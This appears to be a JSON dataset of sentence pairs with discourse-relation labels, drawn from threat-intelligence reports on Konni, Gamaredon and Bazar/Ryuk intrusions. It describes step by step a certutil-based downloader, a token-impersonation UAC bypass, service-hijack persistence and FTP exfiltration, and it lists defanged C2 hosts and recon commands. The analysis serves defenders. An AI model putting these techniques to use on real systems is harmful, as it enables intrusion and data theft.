[
    {
        "S1": "In mid-July 2019 I encountered with an emerging campaign delivering the Konni malware.",
        "S2": "The threat actor behind the campaign leveraged a malicious macro-armed Microsoft Word document titled: \u201c\u041e \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u0438 \u043d\u0430 \u041a\u043e\u0440\u0435\u0439\u0441\u043a\u043e\u043c \u043f\u043e\u043b\u0443\u043e\u0441\u0442\u0440\u043e\u0432\u0435 \u0438 \u043f\u0435\u0440\u0441\u043f\u0435\u043a\u0442\u0438\u0432\u0430\u0445 \u0434\u0438\u0430\u043b\u043e\u0433\u0430 \u043c\u0435\u0436\u0434\u0443 \u0421\u0428\u0410 \u0438 \u041a\u041d\u0414\u0420\u201d (translated to: About the situation on the Korean Peninsula and the prospect of a dialogue between the United States and the DPRK).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor behind the campaign leveraged a malicious macro-armed Microsoft Word document titled: \u201c\u041e \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u0438 \u043d\u0430 \u041a\u043e\u0440\u0435\u0439\u0441\u043a\u043e\u043c \u043f\u043e\u043b\u0443\u043e\u0441\u0442\u0440\u043e\u0432\u0435 \u0438 \u043f\u0435\u0440\u0441\u043f\u0435\u043a\u0442\u0438\u0432\u0430\u0445 \u0434\u0438\u0430\u043b\u043e\u0433\u0430 \u043c\u0435\u0436\u0434\u0443 \u0421\u0428\u0410 \u0438 \u041a\u041d\u0414\u0420\u201d (translated to: About the situation on the Korean Peninsula and the prospect of a dialogue between the United States and the DPRK).",
        "S2": "Unlike the previously observed campaign, the August campaign potentially targeting Russian language speakers with an interest in Korean Geo-political situation, the lure document used in this campaign is written Cyrillic and contains content related to North Korean American foreign affairs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Unlike the previously observed campaign, the August campaign potentially targeting Russian language speakers with an interest in Korean Geo-political situation, the lure document used in this campaign is written Cyrillic and contains content related to North Korean American foreign affairs.",
        "S2": "When analyzing the document, we see that the internal codepage of the lure document is 949 \u2014 ANSI/OEM Korean (Unified Hangul Code). indicating that the actor who created the document used Korean keyboard layout.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When analyzing the document, we see that the internal codepage of the lure document is 949 \u2014 ANSI/OEM Korean (Unified Hangul Code). indicating that the actor who created the document used Korean keyboard layout.",
        "S2": "This is an indication that the author is a Korean native speaker.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is an indication that the author is a Korean native speaker.",
        "S2": "The lure document contains VBA macro code with the following capabilities:",
        "relation": "MISC"
    },
    {
        "S1": "The lure document contains VBA macro code with the following capabilities:",
        "S2": "- Changes the font color from light grey to black \u2014 to trick the victim to enable content.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Changes the font color from light grey to black \u2014 to trick the victim to enable content.",
        "S2": "- Checks if windows is a 32 or 64 bit version.",
        "relation": "NEXT"
    },
    {
        "S1": "- Checks if windows is a 32 or 64 bit version.",
        "S2": "- Constructs and executes the command-line to download additional files",
        "relation": "NEXT"
    },
    {
        "S1": "- Constructs and executes the command-line to download additional files",
        "S2": "The document contains 3 hidden text boxes.",
        "relation": "MISC"
    },
    {
        "S1": "The document contains 3 hidden text boxes.",
        "S2": "Each text box has a hexadecimal string constructed to a command that is executed once the document is opened by the victim.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each text box has a hexadecimal string constructed to a command that is executed once the document is opened by the victim.",
        "S2": "Certutil is a living-off the land command line utility that can be used to obtain certificate authority information and configure certificate services.",
        "relation": "MISC"
    },
    {
        "S1": "Certutil is a living-off the land command line utility that can be used to obtain certificate authority information and configure certificate services.",
        "S2": "Threat actors usually utilize certutil to download remote files from a given URL.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors usually utilize certutil to download remote files from a given URL.",
        "S2": "It also incorporates a built-in function to decode base64-encoded files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It also incorporates a built-in function to decode base64-encoded files.",
        "S2": "CMD silently copies certutil.exe into temp directory and rename it to \u201cmx.exe\u201d in an attempt to evade detection and then downloads 1.txt from from a remote resource: http://handicap.eu5[.]org.",
        "relation": "MISC"
    },
    {
        "S1": "CMD silently copies certutil.exe into temp directory and rename it to \u201cmx.exe\u201d in an attempt to evade detection and then downloads 1.txt from from a remote resource: http://handicap.eu5[.]org.",
        "S2": "The text file contains a base64 encoded string that is decoded by certutil and saved as 1.bat.",
        "relation": "NEXT"
    },
    {
        "S1": "The text file contains a base64 encoded string that is decoded by certutil and saved as 1.bat.",
        "S2": "The threat actor removes tracks by silently deleting 1.txt from the temp directory and then executes 1.bat.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor removes tracks by silently deleting 1.txt from the temp directory and then executes 1.bat.",
        "S2": "The batch script acts as a second stage downloader and downloads two additional files, depending on the system architecture.",
        "relation": "NEXT"
    },
    {
        "S1": "The batch script acts as a second stage downloader and downloads two additional files, depending on the system architecture.",
        "S2": "Certutil is executed to download a txt file and decode its content.",
        "relation": "MISC"
    },
    {
        "S1": "Certutil is executed to download a txt file and decode its content.",
        "S2": "Decoding each base64 string (32-bit or 64-bit version) results in a cabinet file \u2014 setup.cab",
        "relation": "NEXT"
    },
    {
        "S1": "Decoding each base64 string (32-bit or 64-bit version) results in a cabinet file \u2014 setup.cab",
        "S2": "The content of the cabinet file is then extracted into %temp% folder, and setup.cab file is deleted from the system.",
        "relation": "NEXT"
    },
    {
        "S1": "The content of the cabinet file is then extracted into %temp% folder, and setup.cab file is deleted from the system.",
        "S2": "Install.bat \u2014 acts as installer to ensure persistence and execute mshlpsrvc.dll.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Install.bat \u2014 acts as installer to ensure persistence and execute mshlpsrvc.dll.",
        "S2": "mshlpweb.dll \u2014 acts as loader; responsible to elevate privileges.",
        "relation": "LIST"
    },
    {
        "S1": "mshlpweb.dll \u2014 acts as loader; responsible to elevate privileges.",
        "S2": "mshlpsrvc.dll \u2014 final payload; responsible for data exfiltration.",
        "relation": "LIST"
    },
    {
        "S1": "mshlpsrvc.dll \u2014 final payload; responsible for data exfiltration.",
        "S2": "mshlpsrvc.ini \u2014 configuration file; contains URL used by mshlpsrvc.dll",
        "relation": "LIST"
    },
    {
        "S1": "mshlpsrvc.ini \u2014 configuration file; contains URL used by mshlpsrvc.dll",
        "S2": "Both dropped DLL files are unsigned and packed with UPX packer.",
        "relation": "MISC"
    },
    {
        "S1": "Both dropped DLL files are unsigned and packed with UPX packer.",
        "S2": "To check level of permissions, the threat actor uses net.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "To check level of permissions, the threat actor uses net.exe.",
        "S2": "if the current user has high privileges, install.bat is executed directly.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "if the current user has high privileges, install.bat is executed directly.",
        "S2": "Otherwise, mshlpweb.dll is executed using rundll32.exe.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Otherwise, mshlpweb.dll is executed using rundll32.exe.",
        "S2": "mshlpweb.dll is a loader that uses a known token impersonation technique to elevate permissions and execute install.bat with high privileges.",
        "relation": "ELABORATION"
    },
    {
        "S1": "mshlpweb.dll is a loader that uses a known token impersonation technique to elevate permissions and execute install.bat with high privileges.",
        "S2": "To gain higher privileges mshlpweb.dll execute the Windows Update Standalone Installer, wusa.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To gain higher privileges mshlpweb.dll execute the Windows Update Standalone Installer, wusa.exe.",
        "S2": "This process runs as a high-integrity process by default, since its set to auto-elevate within its manifest.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This process runs as a high-integrity process by default, since its set to auto-elevate within its manifest.",
        "S2": "mshlpweb.dll contains an access token impersonation routine that duplicates the token of the high integrity instance of wusa.exe, and uses it to create a new cmd.exe process running under the security context of the impersonated user[2], which in turn execute the installer \u2014 install.bat.",
        "relation": "NEXT"
    },
    {
        "S1": "mshlpweb.dll contains an access token impersonation routine that duplicates the token of the high integrity instance of wusa.exe, and uses it to create a new cmd.exe process running under the security context of the impersonated user[2], which in turn execute the installer \u2014 install.bat.",
        "S2": "mshlpweb.dll utilize a set of standard windows API calls to duplicate the token of wusa.exe and use it to spawn high integrity instance of cmd.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "mshlpweb.dll utilize a set of standard windows API calls to duplicate the token of wusa.exe and use it to spawn high integrity instance of cmd.exe.",
        "S2": "Higher privileges are needed to execute the installer, install.bat.",
        "relation": "MISC"
    },
    {
        "S1": "Higher privileges are needed to execute the installer, install.bat.",
        "S2": "The technique used by the threat actor is a full fileless UAC bypass named \u201cCavalry\u201d that was leaked back in March 2017 to WikiLeaks as part of \u201cVault 7\u201d, a series of leaks on the US CIA that included sophisticated privilege escalation techniques used by several actors in the wild since the leakage [3].",
        "relation": "ELABORATION"
    },
    {
        "S1": "The technique used by the threat actor is a full fileless UAC bypass named \u201cCavalry\u201d that was leaked back in March 2017 to WikiLeaks as part of \u201cVault 7\u201d, a series of leaks on the US CIA that included sophisticated privilege escalation techniques used by several actors in the wild since the leakage [3].",
        "S2": "This technique also bypasses UAC with the \u201cAlwaysNotify\u201d settings.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This technique also bypasses UAC with the \u201cAlwaysNotify\u201d settings.",
        "S2": "Technique flow:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Technique flow:",
        "S2": "- wusa.exe is executed in hidden window using ShellExecuteExW;",
        "relation": "ELABORATION"
    },
    {
        "S1": "- wusa.exe is executed in hidden window using ShellExecuteExW;",
        "S2": "- Handle to the access token associated with wusa.exe is created.",
        "relation": "NEXT"
    },
    {
        "S1": "- Handle to the access token associated with wusa.exe is created.",
        "S2": "- The token object of wusa.exe is duplicated using DuplicateTokenEx.",
        "relation": "NEXT"
    },
    {
        "S1": "- The token object of wusa.exe is duplicated using DuplicateTokenEx.",
        "S2": "The threat actor pass \u201cToken_all_access\u201d as desired access, which combines all possible access rights for a token and creates a new impersonation token.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor pass \u201cToken_all_access\u201d as desired access, which combines all possible access rights for a token and creates a new impersonation token.",
        "S2": "New SID with medium privileges is created and set with NtSetInformationToken to the new duplicated token to lower its mandatory integrity level.",
        "relation": "NEXT"
    },
    {
        "S1": "New SID with medium privileges is created and set with NtSetInformationToken to the new duplicated token to lower its mandatory integrity level.",
        "S2": "Restricted token is then created and duplicated using NtFilterToken and DuplicateTokenEx respectively.",
        "relation": "NEXT"
    },
    {
        "S1": "Restricted token is then created and duplicated using NtFilterToken and DuplicateTokenEx respectively.",
        "S2": "The new duplicated token is passed to ImpersonateLoggedOnUser.",
        "relation": "NEXT"
    },
    {
        "S1": "The new duplicated token is passed to ImpersonateLoggedOnUser.",
        "S2": "An elevated cmd instance is spawned using CreateProcessWithLogonW function.",
        "relation": "NEXT"
    },
    {
        "S1": "An elevated cmd instance is spawned using CreateProcessWithLogonW function.",
        "S2": "The credentials passed as arguments to the function (Username: aaa, Domain: bbb, Password: ccc) are identical to the credentials specified in the UAC bypass implementation by FuzzySecurity, UAC-TokenMagic [4]",
        "relation": "NEXT"
    },
    {
        "S1": "The credentials passed as arguments to the function (Username: aaa, Domain: bbb, Password: ccc) are identical to the credentials specified in the UAC bypass implementation by FuzzySecurity, UAC-TokenMagic [4]",
        "S2": "I used the James Forshaw\u2019s excellent blog [6] explaining in detail how to bypass UAC using the technique above.",
        "relation": "ELABORATION"
    },
    {
        "S1": "I used the James Forshaw\u2019s excellent blog [6] explaining in detail how to bypass UAC using the technique above.",
        "S2": "When the installer is executed, it first stops COMSysApp, a service that manages the configuration and tracking of Component Object Model (COM)-based components, using sc.exe utility.",
        "relation": "MISC"
    },
    {
        "S1": "When the installer is executed, it first stops COMSysApp, a service that manages the configuration and tracking of Component Object Model (COM)-based components, using sc.exe utility.",
        "S2": "- COMSysApp service is first configured to autostart and the binpath of the service is set to svchost.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- COMSysApp service is first configured to autostart and the binpath of the service is set to svchost.exe.",
        "S2": "- COMSysApp service is added under the \u201cSvcHost\u201d key as a preliminary step to its execution in the context of svchost.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "- COMSysApp service is added under the \u201cSvcHost\u201d key as a preliminary step to its execution in the context of svchost.exe.",
        "S2": "- The malicious DLL is added as a service DLL of COMSysApp.",
        "relation": "NEXT"
    },
    {
        "S1": "- The malicious DLL is added as a service DLL of COMSysApp.",
        "S2": "- COMSysApp service is restarted.",
        "relation": "NEXT"
    },
    {
        "S1": "- COMSysApp service is restarted.",
        "S2": "Once COMSysApp service is restarted the malware is loaded in memory, and the batch file is removed from the infected system.",
        "relation": "NEXT"
    },
    {
        "S1": "Once COMSysApp service is restarted the malware is loaded in memory, and the batch file is removed from the infected system.",
        "S2": "The final payload (mshlpsrvc.dll), and its configuration file (mshlpsrvc.ini) are both copied into the system32 directory from the temp directory and then deleted.",
        "relation": "NEXT"
    },
    {
        "S1": "The final payload (mshlpsrvc.dll), and its configuration file (mshlpsrvc.ini) are both copied into the system32 directory from the temp directory and then deleted.",
        "S2": "After ComSysApp service is restarted, a new instance of svchost.exe is spawned and loads the final payload mshlpsrvc.dll.",
        "relation": "NEXT"
    },
    {
        "S1": "After ComSysApp service is restarted, a new instance of svchost.exe is spawned and loads the final payload mshlpsrvc.dll.",
        "S2": "mshlpsrvc.ini is a configuration file that was delivered together with mshlpsrv.dll in earlier stage of the attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "mshlpsrvc.ini is a configuration file that was delivered together with mshlpsrv.dll in earlier stage of the attack.",
        "S2": "This file contains a Base64-encoded string with a custom key, the file is read and decoded by mshlpsrvc.dll to perform an outbound connection and download handicap[.]eu5[.]org/4.txt.",
        "relation": "NEXT"
    },
    {
        "S1": "This file contains a Base64-encoded string with a custom key, the file is read and decoded by mshlpsrvc.dll to perform an outbound connection and download handicap[.]eu5[.]org/4.txt.",
        "S2": "Prior to execution of any recon command to gather information from the target machine, the default codepage of the console is changed to \u201c65001\u201d (utf-8)",
        "relation": "NEXT"
    },
    {
        "S1": "Prior to execution of any recon command to gather information from the target machine, the default codepage of the console is changed to \u201c65001\u201d (utf-8)",
        "S2": "The following information is gathered from the affected machine and sent back to the control server:",
        "relation": "NEXT"
    },
    {
        "S1": "The following information is gathered from the affected machine and sent back to the control server:",
        "S2": "- System info using: cmd /c systeminfo >%temp%\\temp.ini",
        "relation": "ELABORATION"
    },
    {
        "S1": "- System info using: cmd /c systeminfo >%temp%\\temp.ini",
        "S2": "- List of running process using: cmd /c tasklist >%temp%\\temp.ini",
        "relation": "LIST"
    },
    {
        "S1": "- List of running process using: cmd /c tasklist >%temp%\\temp.ini",
        "S2": "- The temp.ini file is then compressed into a cabinet file and saved to C:\\Windows\\TEMP: cmd /c makecab \u201cC:\\Windows\\TEMP\\temp.ini\u201d \u201cC:\\Windows\\TEMP\\temp.cab\u201d",
        "relation": "LIST"
    },
    {
        "S1": "- The temp.ini file is then compressed into a cabinet file and saved to C:\\Windows\\TEMP: cmd /c makecab \u201cC:\\Windows\\TEMP\\temp.ini\u201d \u201cC:\\Windows\\TEMP\\temp.cab\u201d",
        "S2": "- The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before.",
        "relation": "LIST"
    },
    {
        "S1": "- The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before.",
        "S2": "Following decoding, the file content appears to be the FTP credentials for the FTP service that acts as the command & control server for this attack.",
        "relation": "NEXT"
    },
    {
        "S1": "Following decoding, the file content appears to be the FTP credentials for the FTP service that acts as the command & control server for this attack.",
        "S2": "We\u2019ve observed similar past campaigns where free FTP services were used as the C2 for other Konni and Syscon variants, staring from October 2017.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We\u2019ve observed similar past campaigns where free FTP services were used as the C2 for other Konni and Syscon variants, staring from October 2017.",
        "S2": "[5]",
        "relation": "MISC"
    },
    {
        "S1": "[5]",
        "S2": "The data is exfiltrated in the following way:",
        "relation": "MISC"
    },
    {
        "S1": "The data is exfiltrated in the following way:",
        "S2": "- The temp.cab is base64 encoded with the same custom key used earlier.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- The temp.cab is base64 encoded with the same custom key used earlier.",
        "S2": "- Encoded temp.cab is copied to a post.txt under the directory C:\\Windows\\TEMP.",
        "relation": "NEXT"
    },
    {
        "S1": "- Encoded temp.cab is copied to a post.txt under the directory C:\\Windows\\TEMP.",
        "S2": "- files uploaded to the control server using \u201cstor\u201d command.",
        "relation": "NEXT"
    },
    {
        "S1": "The case we found arrived through a targeted email that contained a document file (in docx format).",
        "S2": "Opening document starts a template injection technique for loading the document template from the internet.",
        "relation": "NEXT"
    },
    {
        "S1": "Opening document starts a template injection technique for loading the document template from the internet.",
        "S2": "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).",
        "relation": "NEXT"
    },
    {
        "S1": "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).",
        "S2": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
        "S2": "During the time of the analysis however, the C&C server was not accessible, which made us unable to get additional payloads.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During the time of the analysis however, the C&C server was not accessible, which made us unable to get additional payloads.",
        "S2": "The attacks we found all arrived through targeted emails (MITRE ATT&CK framework ID T1193).",
        "relation": "MISC"
    },
    {
        "S1": "The attacks we found all arrived through targeted emails (MITRE ATT&CK framework ID T1193).",
        "S2": "One of them even had the subject \u201cCoronavirus (2019-nCoV).\u201d",
        "relation": "ELABORATION"
    },
    {
        "S1": "One of them even had the subject \u201cCoronavirus (2019-nCoV).\u201d",
        "S2": "The use of socially relevant topics is a common practice for attackers who wish to make their emails and documents more tempting to open.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The use of socially relevant topics is a common practice for attackers who wish to make their emails and documents more tempting to open.",
        "S2": "The email that used the coronavirus-related subject came with an attached document file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The email that used the coronavirus-related subject came with an attached document file.",
        "S2": "Opening this file (MITRE ATT&CK framework ID T1204) executes the template injection method (MITRE ATT&CK framework ID T1221).",
        "relation": "NEXT"
    },
    {
        "S1": "Opening this file (MITRE ATT&CK framework ID T1204) executes the template injection method (MITRE ATT&CK framework ID T1221).",
        "S2": "The downloaded document template (in dot format) could differ slightly depending on each download.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The downloaded document template (in dot format) could differ slightly depending on each download.",
        "S2": "However, its Exif info or metadata remains consistent and shares the following details:",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, its Exif info or metadata remains consistent and shares the following details:",
        "S2": "As mentioned, the template contains malicious macro (MITRE ATT&CK framework ID T1064), which exports VBS (MITRE ATT&CK framework ID T1064) to execute itself.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As mentioned, the template contains malicious macro (MITRE ATT&CK framework ID T1064), which exports VBS (MITRE ATT&CK framework ID T1064) to execute itself.",
        "S2": "More specifically it drops \u201c%USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs,\u201d which is hardcoded in the macro, and then executed in \u201cwscript.exe //b %USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs.\u201d",
        "relation": "ELABORATION"
    },
    {
        "S1": "More specifically it drops \u201c%USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs,\u201d which is hardcoded in the macro, and then executed in \u201cwscript.exe //b %USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs.\u201d",
        "S2": "PlayList.vbs contains the obfuscated codes (MITRE ATT&CK framework ID T1140), which it executes after decrypting the obfuscations.",
        "relation": "NEXT"
    },
    {
        "S1": "PlayList.vbs contains the obfuscated codes (MITRE ATT&CK framework ID T1140), which it executes after decrypting the obfuscations.",
        "S2": "This particular behavior is a slight departure from previously reported attacks by Gamaredon, which did not use this technique.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This particular behavior is a slight departure from previously reported attacks by Gamaredon, which did not use this technique.",
        "S2": "Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts (MITRE ATT&CK framework ID T1060)",
        "relation": "MISC"
    },
    {
        "S1": "Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts (MITRE ATT&CK framework ID T1060)",
        "S2": "Connect with \u201chxxp:// kristom[.]hopto[.]org /{computer name}_{hexadecimal volume serious number}/help_05_03[.]php\u201d (MITRE ATT&CK framework IDs T1043, T1071, T1082)",
        "relation": "NEXT"
    },
    {
        "S1": "Connect with \u201chxxp:// kristom[.]hopto[.]org /{computer name}_{hexadecimal volume serious number}/help_05_03[.]php\u201d (MITRE ATT&CK framework IDs T1043, T1071, T1082)",
        "S2": "If the downloaded file size in the first step exceeds 10,485 bytes, then the file is saved as \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt\u201d (MITRE ATT&CK framework ID T1105)",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the downloaded file size in the first step exceeds 10,485 bytes, then the file is saved as \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt\u201d (MITRE ATT&CK framework ID T1105)",
        "S2": "Use XOR for the file saved from the second step, where ASCII code converted from its own hexadecimal volume serial number is used as the key.",
        "relation": "NEXT"
    },
    {
        "S1": "Use XOR for the file saved from the second step, where ASCII code converted from its own hexadecimal volume serial number is used as the key.",
        "S2": "The decrypted result is saved as \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d (T1001)",
        "relation": "NEXT"
    },
    {
        "S1": "The decrypted result is saved as \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d (T1001)",
        "S2": "If the file size of \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d exceeds 4,485 bytes, it is executed.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the file size of \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d exceeds 4,485 bytes, it is executed.",
        "S2": "Both \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt\u201d and \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d are then deleted (MITRE ATT&CK framework ID T1107)",
        "relation": "NEXT"
    },
    {
        "S1": "Both \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt\u201d and \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d are then deleted (MITRE ATT&CK framework ID T1107)",
        "S2": "The observed routines of this VBS closely follow the other reports published on Gamaredon, such as the one from SentinelOne.",
        "relation": "MISC"
    },
    {
        "S1": "The observed routines of this VBS closely follow the other reports published on Gamaredon, such as the one from SentinelOne.",
        "S2": "However, the macro generated VBS was obfuscated in this case, likely as an additional evasive tactic.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, the macro generated VBS was obfuscated in this case, likely as an additional evasive tactic.",
        "S2": "Interestingly, after decoding the VBS, we saw what appeared to be a programming mistake by the attacker.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Interestingly, after decoding the VBS, we saw what appeared to be a programming mistake by the attacker.",
        "S2": "Lines 53 and 54 in figure 6 are for closing those downloaded and decoded TXT and EXE files, which are variables defined right before the IF statement.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Lines 53 and 54 in figure 6 are for closing those downloaded and decoded TXT and EXE files, which are variables defined right before the IF statement.",
        "S2": "If, however, these lines do not pass through this IF statement, an error would occur.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If, however, these lines do not pass through this IF statement, an error would occur.",
        "S2": "It shows that this malware is not tested enough, and may still be under development.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It shows that this malware is not tested enough, and may still be under development.",
        "S2": "Our analysis found several URLs of the network destinations for both template injection and VBS.",
        "relation": "MISC"
    },
    {
        "S1": "Our analysis found several URLs of the network destinations for both template injection and VBS.",
        "S2": "While resolving them to IP addresses to understand their attack bases, we also found that they were all linked to the following IP addresses.",
        "relation": "NEXT"
    },
    {
        "S1": "While resolving them to IP addresses to understand their attack bases, we also found that they were all linked to the following IP addresses.",
        "S2": "Network destination for template injection: 176[.]119[.]147[.]225",
        "relation": "ELABORATION"
    },
    {
        "S1": "Network destination for template injection: 176[.]119[.]147[.]225",
        "S2": "Network destination for VBS: 176[.]57[.]215[.]115",
        "relation": "LIST"
    },
    {
        "S1": "Network destination for VBS: 176[.]57[.]215[.]115",
        "S2": "These IP addresses are from Russian hosting companies.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These IP addresses are from Russian hosting companies.",
        "S2": "Most likely, the attackers rented Virtual Private Server (VPS) as their attack base.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Most likely, the attackers rented Virtual Private Server (VPS) as their attack base.",
        "S2": "Their URL for VBS (shown below) likely includes the data when they conducted the attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the actions began via a loader malware known as Bazar/Kegtap.",
        "S2": "Reports indicate an email delivery via malspam, which has been creeping up in volume over the month of September.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Reports indicate an email delivery via malspam, which has been creeping up in volume over the month of September.",
        "S2": "From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes.",
        "relation": "NEXT"
    },
    {
        "S1": "From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes.",
        "S2": "The initial goal of this activity was to run discovery using built in Windows utilities like nltest, net group, and the 3rd party utility AdFind.",
        "relation": "NEXT"
    },
    {
        "S1": "The initial goal of this activity was to run discovery using built in Windows utilities like nltest, net group, and the 3rd party utility AdFind.",
        "S2": "After the initial discovery activity the Bazar malware stayed relatively quiet, until a second round of discovery the following day.",
        "relation": "NEXT"
    },
    {
        "S1": "After the initial discovery activity the Bazar malware stayed relatively quiet, until a second round of discovery the following day.",
        "S2": "Again, the same tools were employed in the second round of discovery, plus Rubeus.",
        "relation": "NEXT"
    },
    {
        "S1": "Again, the same tools were employed in the second round of discovery, plus Rubeus.",
        "S2": "This time the discovery collection was exfiltrated via FTP to a server hosted in Russia.",
        "relation": "NEXT"
    },
    {
        "S1": "This time the discovery collection was exfiltrated via FTP to a server hosted in Russia.",
        "S2": "Next, the threat actor began to move laterally.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the threat actor began to move laterally.",
        "S2": "It took a few attempts, using various methods, from remote WMI, to remote service execution with PowerShell, until finally landing on Cobalt Strike beacon executable files transferred over SMB to move around the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "It took a few attempts, using various methods, from remote WMI, to remote service execution with PowerShell, until finally landing on Cobalt Strike beacon executable files transferred over SMB to move around the environment.",
        "S2": "From here forward, the threat actors relied on a Cobalt Strike beacon running on a domain controller as their main operations point.",
        "relation": "NEXT"
    },
    {
        "S1": "From here forward, the threat actors relied on a Cobalt Strike beacon running on a domain controller as their main operations point.",
        "S2": "After picking the most reliable method to move through the environment, the threat actor then proceeded to establish beacons across the enterprise.",
        "relation": "NEXT"
    },
    {
        "S1": "After picking the most reliable method to move through the environment, the threat actor then proceeded to establish beacons across the enterprise.",
        "S2": "In preparation for their final objectives, they used PowerShell to disable Windows Defender in the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "In preparation for their final objectives, they used PowerShell to disable Windows Defender in the environment.",
        "S2": "The server utilized for backups in the domain was targeted first for encryption, with some further preparation completed on the host.",
        "relation": "NEXT"
    },
    {
        "S1": "The server utilized for backups in the domain was targeted first for encryption, with some further preparation completed on the host.",
        "S2": "However, once the Ryuk ransom executable was transferred over SMB from their domain controller (DC) pivot, it only took one minute to execute it.",
        "relation": "NEXT"
    },
    {
        "S1": "However, once the Ryuk ransom executable was transferred over SMB from their domain controller (DC) pivot, it only took one minute to execute it.",
        "S2": "At this point Ryuk was transferred to the rest of the hosts in the environment via SMB and executed through an RDP connection from the pivot domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "At this point Ryuk was transferred to the rest of the hosts in the environment via SMB and executed through an RDP connection from the pivot domain controller.",
        "S2": "In total, the campaign lasted 29 hours\u2013from initial execution of the Bazar, to domain wide ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "In total, the campaign lasted 29 hours\u2013from initial execution of the Bazar, to domain wide ransomware.",
        "S2": "If a defender missed the first day of recon, they would have had a little over 3 hours to respond before being ransomed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If a defender missed the first day of recon, they would have had a little over 3 hours to respond before being ransomed.",
        "S2": "The threat actors requested 600+ bitcoins, which have a market value of around 6+ million USD.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors requested 600+ bitcoins, which have a market value of around 6+ million USD.",
        "S2": "Initial delivery was via email with a link to the Bazar/Kegtap backdoor loader.",
        "relation": "MISC"
    },
    {
        "S1": "Initial delivery was via email with a link to the Bazar/Kegtap backdoor loader.",
        "S2": "We downloaded and ran Document-Preview.exe, which connected to 5.182.210[.]145 over 443/https.",
        "relation": "NEXT"
    },
    {
        "S1": "We downloaded and ran Document-Preview.exe, which connected to 5.182.210[.]145 over 443/https.",
        "S2": "Service execution was used several times to execute scripts and executables during lateral movement.",
        "relation": "NEXT"
    },
    {
        "S1": "Service execution was used several times to execute scripts and executables during lateral movement.",
        "S2": "WMI was used as well in an attempt to execute dlls laterally.",
        "relation": "NEXT"
    },
    {
        "S1": "WMI was used as well in an attempt to execute dlls laterally.",
        "S2": "The threat actors also performed process injection.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors also performed process injection.",
        "S2": "Disabling Windows Defender.",
        "relation": "NEXT"
    },
    {
        "S1": "Disabling Windows Defender.",
        "S2": "AdFind and adf.bat were dropped and run minutes after Document-Preview.exe was executed.",
        "relation": "NEXT"
